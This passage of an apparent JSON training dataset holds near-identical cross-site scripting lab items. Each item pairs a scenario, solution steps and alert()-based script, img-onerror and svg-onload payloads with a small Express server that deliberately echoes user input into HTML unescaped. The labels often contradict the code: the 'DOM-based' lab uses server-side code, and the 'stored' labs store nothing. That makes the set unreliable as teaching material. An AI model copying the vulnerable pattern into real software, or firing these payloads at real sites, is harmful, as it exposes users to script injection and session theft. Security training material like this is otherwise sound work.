    "Lab Description": "Leaderboard entries are dynamically generated from user input and rendered unsanitized. To solve: Inject a malicious payload in the name field.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Submit a name: <img src=x onerror=alert('Leaderboard')>.",
      "Observe DOM injection and execution.",
      "Test chained payloads.",
      "Confirm payload triggers without user interaction.",
      "Monitor network and DOM behavior."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-score', (req, res) => {\n  const player = req.body.player;\n  res.send(`<div>${player} joined the game!</div>`);\n});\n\napp.listen(3000);",
    "payloads": [
      "<img src=x onerror=alert('Leaderboard')>",
      "<svg onload=alert('LeaderboardXSS')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in book review platform comment field",
    "Lab Description": "A book review platform allows users to comment on books. Comments are rendered without sanitization, leading to stored XSS. To solve: Inject a script payload in the comment field.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Post a comment with <script>alert('BookXSS')</script>.",
      "Visit the book page to trigger execution.",
      "Try different payloads for stealth.",
      "Check persistence after logout.",
      "Confirm XSS across multiple sessions."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-comment', (req, res) => {\n  const comment = req.body.comment;\n  res.send(`<div>${comment}</div>`);\n});\n\napp.listen(3000);",
    "payloads": [
      "<script>alert('BookXSS')</script>",
      "<img src=x onerror=alert('BookReview')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in order tracking system",
    "Lab Description": "Order tracking page reflects user-supplied tracking IDs into the HTML unsanitized. To solve: Inject a reflected XSS payload.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Enter tracking ID: <script>alert('TrackXSS')</script>.",
      "Check order status page for script execution.",
      "Test alternative payload formats.",
      "Verify execution across different browsers.",
      "Attempt encoding bypass techniques."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/track-order', (req, res) => {\n  const trackingId = req.body.trackingId;\n  res.send(`<h2>Tracking result for: ${trackingId}</h2>`);\n});\n\napp.listen(3000);",
    "payloads": [
      "<script>alert('TrackXSS')</script>",
      "<svg/onload=alert('TrackError')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in event organizer description field",
    "Lab Description": "An event platform allows organizers to provide a description. The description is displayed without sanitization. To solve: Inject persistent XSS into the description.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Create an event with description: <script>alert('EventXSS')</script>.",
      "View event page and observe execution.",
      "Use encoded payloads for stealth.",
      "Check persistence after event edit.",
      "Monitor behavior across user roles."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/create-event', (req, res) => {\n  const description = req.body.description;\n  res.send(`<section>${description}</section>`);\n});\n\napp.listen(3000);",
    "payloads": [
      "<script>alert('EventXSS')</script>",
      "<img src=x onerror=alert('Event')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in account activation confirmation page",
    "Lab Description": "Activation confirmation page reflects email without proper encoding. To solve: Inject an XSS payload.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit activation with email: <script>alert('Activate')</script>.",
      "Observe payload execution in confirmation page.",
      "Test encoded alternatives.",
      "Fuzz for multiple input fields.",
      "Confirm behavior in different devices."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/activate-account', (req, res) => {\n  const email = req.body.email;\n  res.send(`<p>Activation email sent to: ${email}</p>`);\n});\n\napp.listen(3000);",
    "payloads": [
      "<script>alert('Activate')</script>",
      "<img src=x onerror=alert('ActivationXSS')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in online quiz user nickname",
    "Lab Description": "The quiz platform allows setting a nickname, which is reflected without escaping. To solve: Inject a persistent XSS payload in the nickname.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Join quiz with nickname: <script>alert('QuizXSS')</script>.",
      "Reload quiz scoreboard page.",
      "Observe XSS execution.",
      "Attempt nested HTML injection.",
      "Confirm execution for all viewers."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/join-quiz', (req, res) => {\n  const nickname = req.body.nickname;\n  res.send(`<h2>Player: ${nickname}</h2>`);\n});\n\napp.listen(3000);",
    "payloads": [
      "<script>alert('QuizXSS')</script>",
      "<svg/onload=alert('Nickname')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in support ticket submission preview",
    "Lab Description": "Support ticket preview reflects ticket title without encoding. To solve: Inject a reflected XSS payload.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit a ticket with title: <script>alert('TicketXSS')</script>.",
      "Preview the ticket and observe script execution.",
      "Test SVG and iframe-based payloads.",
      "Use DevTools for DOM inspection.",
      "Confirm behavior on mobile and desktop."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/preview-ticket', (req, res) => {\n  const title = req.body.title;\n  res.send(`<div>${title}</div>`);\n});\n\napp.listen(3000);",
    "payloads": [
      "<script>alert('TicketXSS')</script>",
      "<img src=x onerror=alert('Ticket')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in task management app project name",
    "Lab Description": "Users create projects with names rendered without sanitization. To solve: Inject a script payload into the project name field.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Create a project named <script>alert('ProjectXSS')</script>.",
      "View project dashboard.",
      "Observe persistent XSS execution.",
      "Test variations with different event handlers.",
      "Validate across user roles."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/create-project', (req, res) => {\n  const project = req.body.project;\n  res.send(`<h3>${project}</h3>`);\n});\n\napp.listen(3000);",
    "payloads": [
      "<script>alert('ProjectXSS')</script>",
      "<svg/onload=alert('Project')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in online auction bid page",
    "Lab Description": "The auction platform reflects item names during bid confirmation without escaping. To solve: Inject a reflected XSS payload.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Place bid with item name: <script>alert('Auction')</script>.",
      "Observe execution in bid confirmation.",
      "Use alternative encoded payloads.",
      "Fuzz for multiple vulnerable fields.",
      "Monitor DOM mutations."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/bid-item', (req, res) => {\n  const item = req.body.item;\n  res.send(`<p>Bid placed on: ${item}</p>`);\n});\n\napp.listen(3000);",
    "payloads": [
      "<script>alert('Auction')</script>",
      "<img src=x onerror=alert('AuctionXSS')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in recipe sharing app recipe title",
    "Lab Description": "Recipe titles are displayed on the homepage without sanitization. To solve: Inject a script payload into the recipe title.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Create a recipe with title: <script>alert('RecipeXSS')</script>.",
      "Open homepage and observe XSS.",
      "Test additional HTML event injections.",
      "Validate across user sessions.",
      "Test variations with nested tags."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-recipe', (req, res) => {\n  const title = req.body.title;\n  res.send(`<div>${title}</div>`);\n});\n\napp.listen(3000);",
    "payloads": [
      "<script>alert('RecipeXSS')</script>",
      "<img src=x onerror=alert('Recipe')>"
    ]
  },
  {
    "Lab scenario": "DOM-based XSS in dynamic poll creation page",
    "Lab Description": "Poll options are dynamically inserted from localStorage without escaping. To solve: Inject a script into the localStorage option.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Set localStorage.pollOption = '<img src=x onerror=alert(\"Poll\")>'.",
      "Reload poll creation page.",
      "Observe execution on load.",
      "Test nesting payloads inside table rows.",
      "Validate execution persistence."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/create-poll', (req, res) => {\n  const option = req.body.option;\n  res.send(`<li>${option}</li>`);\n});\n\napp.listen(3000);",
    "payloads": [
      "<img src=x onerror=alert('Poll')>",
      "<svg/onload=alert('PollXSS')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in online bookstore author bio field",
    "Lab Description": "Authors can submit bios for their profile pages. The input is displayed without sanitization. To solve: Inject a stored XSS payload into the bio.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit bio with <script>alert('AuthorXSS')</script>.",
      "Reload the author's profile page.",
      "Observe execution of the script.",
      "Test for multiple event handlers.",
      "Confirm persistence after logout/login."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/update-bio', (req, res) => {\n  const bio = req.body.bio;\n  res.send(`<div>${bio}</div>`);\n});\n\napp.listen(3000);",
    "payloads": [
      "<script>alert('AuthorXSS')</script>",
      "<img src=x onerror=alert('Author')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in product search filter",
    "Lab Description": "A product search filter reflects user input in search results without sanitization. To solve: Inject a reflected XSS payload.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Search using: <script>alert('SearchXSS')</script>.",
      "Observe payload execution in the results page.",
      "Try encoded payloads for filter bypass.",
      "Confirm behavior across browsers.",
      "Test different injection vectors."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/search-products', (req, res) => {\n  const query = req.body.query;\n  res.send(`<h2>Search results for: ${query}</h2>`);\n});\n\napp.listen(3000);",
    "payloads": [
      "<script>alert('SearchXSS')</script>",
      "<svg/onload=alert('Search')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in student portal project title",
    "Lab Description": "Students submit project titles which are rendered without escaping. To solve: Inject a stored XSS payload in the title.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit a project titled <script>alert('StudentXSS')</script>.",
      "Open project list page and observe execution.",
      "Try multiple payloads with nested elements.",
      "Confirm persistence across sessions.",
      "Fuzz to detect other affected fields."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-project', (req, res) => {\n  const title = req.body.title;\n  res.send(`<li>${title}</li>`);\n});\n\napp.listen(3000);",
    "payloads": [
      "<script>alert('StudentXSS')</script>",
      "<img src=x onerror=alert('Project')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in appointment booking confirmation page",
    "Lab Description": "Booking confirmation reflects user-entered name unsanitized. To solve: Inject a reflected XSS payload.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Book an appointment using: <script>alert('BookingXSS')</script> as your name.",
      "Observe script execution in the confirmation.",
      "Check for alternative reflected fields.",
      "Test various payload formats.",
      "Monitor behavior on mobile and desktop."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/confirm-booking', (req, res) => {\n  const name = req.body.name;\n  res.send(`<p>Booking confirmed for: ${name}</p>`);\n});\n\napp.listen(3000);",
    "payloads": [
      "<script>alert('BookingXSS')</script>",
      "<img src=x onerror=alert('Booking')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in movie rating site review field",
    "Lab Description": "Movie reviews are displayed without escaping user input. To solve: Inject a persistent XSS payload into the review field.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Post a review with: <script>alert('MovieXSS')</script>.",
      "Reload the movie page and observe execution.",
      "Test variations using different HTML elements.",
      "Confirm persistence after session logout.",
      "Check for other reflective fields."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-review', (req, res) => {\n  const review = req.body.review;\n  res.send(`<blockquote>${review}</blockquote>`);\n});\n\napp.listen(3000);",
    "payloads": [
      "<script>alert('MovieXSS')</script>",
      "<svg/onload=alert('Review')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in newsletter subscription success message",
    "Lab Description": "Subscription confirmation reflects email address without escaping. To solve: Inject a reflected XSS payload.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Subscribe with: <script>alert('SubscribeXSS')</script> as email.",
      "Observe execution in the confirmation page.",
      "Try URL encoding and alternative vectors.",
      "Confirm script execution on reload.",
      "Test across different browser types."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/subscribe', (req, res) => {\n  const email = req.body.email;\n  res.send(`<h1>Welcome ${email}!</h1>`);\n});\n\napp.listen(3000);",
    "payloads": [
      "<script>alert('SubscribeXSS')</script>",
      "<img src=x onerror=alert('Newsletter')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in bug tracker issue title",
    "Lab Description": "Bug tracker displays issue titles without escaping. To solve: Inject a persistent XSS payload into the issue title field.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Create a bug report with: <script>alert('BugXSS')</script> as the title.",
      "Visit the issues page and observe execution.",
      "Test with different events (onmouseover, onclick).",
      "Confirm script persistence across reloads.",
      "Try nested tags for more complex injections."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/report-bug', (req, res) => {\n  const title = req.body.title;\n  res.send(`<div>${title}</div>`);\n});\n\napp.listen(3000);",
    "payloads": [
      "<script>alert('BugXSS')</script>",
      "<svg/onload=alert('Bug')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in discount coupon generation page",
    "Lab Description": "Coupon codes are displayed back to users without encoding input. To solve: Inject a reflected XSS payload.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Request coupon with code: <script>alert('CouponXSS')</script>.",
      "Observe execution on the page.",
      "Check for event-based payloads too.",
      "Monitor network requests for stored reflections.",
      "Test encoded injection formats."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/generate-coupon', (req, res) => {\n  const coupon = req.body.coupon;\n  res.send(`<h2>Your coupon: ${coupon}</h2>`);\n});\n\napp.listen(3000);",
    "payloads": [
      "<script>alert('CouponXSS')</script>",
      "<img src=x onerror=alert('Coupon')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in music sharing app playlist description",
    "Lab Description": "Playlist descriptions are rendered without escaping user input. To solve: Inject a stored XSS payload into the playlist description.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Create a playlist with description: <script>alert('MusicXSS')</script>.",
      "Open the playlist page and observe execution.",
      "Test different payload structures.",
      "Try injecting SVG and iframe elements.",
      "Confirm execution across devices."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/create-playlist', (req, res) => {\n  const description = req.body.description;\n  res.send(`<div>${description}</div>`);\n});\n\napp.listen(3000);",
    "payloads": [
      "<script>alert('MusicXSS')</script>",
      "<svg/onload=alert('Playlist')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in travel booking system review form",
    "Lab Description": "Travelers can leave reviews after completing trips. The application renders reviews without sanitizing input. To solve: Inject a stored XSS payload into the review form.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Book a trip and leave a review: <script>alert('TravelXSS')</script>.",
      "Reload the trip review page.",
      "Observe payload execution.",
      "Try event handler based payloads.",
      "Confirm execution on mobile view too."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-review', (req, res) => {\n  const review = req.body.review;\n  res.send(`<p>${review}</p>`);\n});\n\napp.listen(3000);",
    "payloads": [
      "<script>alert('TravelXSS')</script>",
      "<img src=x onerror=alert('Trip')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in blog comment preview",
    "Lab Description": "Before submitting a comment, users see a preview that reflects their input without escaping. To solve: Inject a reflected XSS payload.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Enter a comment: <script>alert('PreviewXSS')</script>.",
      "Observe preview page for script execution.",
      "Test using SVG-based payloads.",
      "Try encoded injection as well.",
      "Monitor network traffic for reflections."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/preview-comment', (req, res) => {\n  const comment = req.body.comment;\n  res.send(`<div>${comment}</div>`);\n});\n\napp.listen(3000);",
    "payloads": [
      "<script>alert('PreviewXSS')</script>",
      "<svg/onload=alert('CommentPreview')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in online food ordering app restaurant description",
    "Lab Description": "Restaurant owners can submit descriptions, which are displayed to customers without sanitization. To solve: Inject a stored XSS payload into the description.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Register a restaurant and use: <script>alert('FoodXSS')</script> as description.",
      "Visit the listing page.",
      "Observe script execution.",
      "Test complex payload chaining techniques.",
      "Verify execution across different accounts."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/add-restaurant', (req, res) => {\n  const description = req.body.description;\n  res.send(`<section>${description}</section>`);\n});\n\napp.listen(3000);",
    "payloads": [
      "<script>alert('FoodXSS')</script>",
      "<img src=x onerror=alert('Restaurant')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in user feedback acknowledgment page",
    "Lab Description": "Feedback confirmation pages reflect user inputs directly. To solve: Inject a reflected XSS payload.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit feedback: <script>alert('FeedbackXSS')</script>.",
      "Observe execution immediately after submission.",
      "Fuzz other parameters for hidden reflections.",
      "Check behavior in different user roles.",
      "Confirm bypass techniques."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-feedback', (req, res) => {\n  const feedback = req.body.feedback;\n  res.send(`<h2>Your feedback: ${feedback}</h2>`);\n});\n\napp.listen(3000);",
    "payloads": [
      "<script>alert('FeedbackXSS')</script>",
      "<svg/onload=alert('Feedback')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in event management site event title field",
    "Lab Description": "Event titles created by organizers are displayed without escaping. To solve: Inject a stored XSS payload into the title.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Create an event titled <script>alert('EventXSS')</script>.",
      "Open the event listing page.",
      "Observe script execution.",
      "Test different event handlers.",
      "Confirm execution across different user views."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/create-event', (req, res) => {\n  const title = req.body.title;\n  res.send(`<header>${title}</header>`);\n});\n\napp.listen(3000);",
    "payloads": [
      "<script>alert('EventXSS')</script>",
      "<img src=x onerror=alert('Event')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in online education platform signup form",
    "Lab Description": "Signup form reflects user input without sanitization. To solve: Inject a reflected XSS payload.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Sign up with a username: <script>alert('SignupXSS')</script>.",
      "Observe the welcome page.",
      "Check if reflected in other fields too.",
      "Experiment with URL-encoded injections.",
      "Test bypassing simple keyword filters."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/signup', (req, res) => {\n  const username = req.body.username;\n  res.send(`<p>Welcome, ${username}!</p>`);\n});\n\napp.listen(3000);",
    "payloads": [
      "<script>alert('SignupXSS')</script>",
      "<img src=x onerror=alert('Signup')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in social network post title",
    "Lab Description": "Users can create posts with titles that are rendered without escaping. To solve: Inject a stored XSS payload into the post title.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Create a post titled <script>alert('PostXSS')</script>.",
      "Open the main feed page.",
      "Observe script execution.",
      "Chain multiple payloads for wider attack surface.",
      "Test across different browsers."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/create-post', (req, res) => {\n  const title = req.body.title;\n  res.send(`<article>${title}</article>`);\n});\n\napp.listen(3000);",
    "payloads": [
      "<script>alert('PostXSS')</script>",
      "<svg/onload=alert('Post')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in email contact us form response",
    "Lab Description": "Contact form response page reflects user name unsanitized. To solve: Inject a reflected XSS payload.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit the form with name: <script>alert('ContactXSS')</script>.",
      "Observe execution on confirmation page.",
      "Try double encoding for filter bypass.",
      "Monitor behavior on desktop and mobile.",
      "Test persistent input handling."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/contact', (req, res) => {\n  const name = req.body.name;\n  res.send(`<h2>Thanks for contacting us, ${name}!</h2>`);\n});\n\napp.listen(3000);",
    "payloads": [
      "<script>alert('ContactXSS')</script>",
      "<img src=x onerror=alert('Contact')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in internal HR portal employee announcement",
    "Lab Description": "Internal announcements by HR are displayed without sanitizing input. To solve: Inject a stored XSS payload in the announcement.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Post an announcement with: <script>alert('HRXSS')</script>.",
      "Reload announcement dashboard.",
      "Observe payload execution.",
      "Experiment with mutation XSS as well.",
      "Confirm execution under different user permissions."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/create-announcement', (req, res) => {\n  const announcement = req.body.announcement;\n  res.send(`<section>${announcement}</section>`);\n});\n\napp.listen(3000);",
    "payloads": [
      "<script>alert('HRXSS')</script>",
      "<svg/onload=alert('Announcement')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in fitness app workout description",
    "Lab Description": "Users can create custom workout plans with descriptions. The description is rendered without sanitization. To solve: Inject a persistent XSS payload into the workout description.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit a new workout with description <script>alert('WorkoutXSS')</script>.",
      "Reload the workout list page.",
      "Observe script execution.",
      "Test other input fields for reflections.",
      "Ensure it persists across sessions."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/create-workout', (req, res) => {\n  const description = req.body.description;\n  res.send(`<p>${description}</p>`);\n});\n\napp.listen(3000);",
    "payloads": [
      "<script>alert('WorkoutXSS')</script>",
      "<img src=x onerror=alert('Workout')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in flight booking search",
    "Lab Description": "Flight booking form reflects the destination parameter in the search result page without sanitization. To solve: Inject a reflected XSS payload.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Search for flights with destination: <script>alert('FlightXSS')</script>.",
      "Observe script execution on results page.",
      "Test using encoded payloads for bypass.",
      "Monitor DOM behavior.",
      "Confirm execution across browsers."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/search-flights', (req, res) => {\n  const destination = req.body.destination;\n  res.send(`<h2>Flights to: ${destination}</h2>`);\n});\n\napp.listen(3000);",
    "payloads": [
      "<script>alert('FlightXSS')</script>",
      "<svg/onload=alert('Flight')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in online bookstore author bio",
    "Lab Description": "Authors can add bios which are displayed without escaping. To solve: Inject a stored XSS payload in the bio field.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Add author bio with <script>alert('AuthorXSS')</script>.",
      "Visit the author's page.",
      "Observe payload execution.",
      "Test multiple vectors in bio.",
      "Check persistence after logout/login."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/add-author', (req, res) => {\n  const bio = req.body.bio;\n  res.send(`<section>${bio}</section>`);\n});\n\napp.listen(3000);",
    "payloads": [
      "<script>alert('AuthorXSS')</script>",
      "<img src=x onerror=alert('Author')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in password reset message",
    "Lab Description": "Password reset confirmation reflects email input without escaping. To solve: Inject a reflected XSS payload.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Request password reset with email: <script>alert('ResetXSS')</script>.",
      "Observe confirmation message.",
      "Try encoded payloads.",
      "Monitor for script execution on confirmation page.",
      "Test multiple browsers."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/reset-password', (req, res) => {\n  const email = req.body.email;\n  res.send(`<p>Password reset link sent to ${email}</p>`);\n});\n\napp.listen(3000);",
    "payloads": [
      "<script>alert('ResetXSS')</script>",
      "<svg/onload=alert('Reset')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in recipe sharing site recipe name",
    "Lab Description": "Recipe names submitted by users are rendered directly. To solve: Inject a stored XSS payload in the recipe name field.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit a recipe titled <script>alert('RecipeXSS')</script>.",
      "View the recipe listing.",
      "Observe script execution.",
      "Test alternate injection techniques.",
      "Confirm behavior on mobile browsers."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-recipe', (req, res) => {\n  const title = req.body.title;\n  res.send(`<h1>${title}</h1>`);\n});\n\napp.listen(3000);",
    "payloads": [
      "<script>alert('RecipeXSS')</script>",
      "<img src=x onerror=alert('Recipe')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in online exam platform result summary",
    "Lab Description": "After submitting an exam, the result page reflects the user's name without sanitization. To solve: Inject a reflected XSS payload.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit an exam with username: <script>alert('ExamXSS')</script>.",
      "Check the result page.",
      "Observe if the script executes.",
      "Test URL-encoded payloads.",
      "Fuzz other fields for hidden vectors."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-exam', (req, res) => {\n  const username = req.body.username;\n  res.send(`<h2>Congratulations, ${username}!</h2>`);\n});\n\napp.listen(3000);",
    "payloads": [
      "<script>alert('ExamXSS')</script>",
      "<svg/onload=alert('Exam')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in online donation site donor message",
    "Lab Description": "Donor messages are displayed without escaping user input. To solve: Inject a stored XSS payload in the message field.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Donate with a message: <script>alert('DonationXSS')</script>.",
      "Check the donor wall.",
      "Observe payload execution.",
      "Fuzz with different payload variants.",
      "Confirm execution across roles."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-donation', (req, res) => {\n  const message = req.body.message;\n  res.send(`<div>${message}</div>`);\n});\n\napp.listen(3000);",
    "payloads": [
      "<script>alert('DonationXSS')</script>",
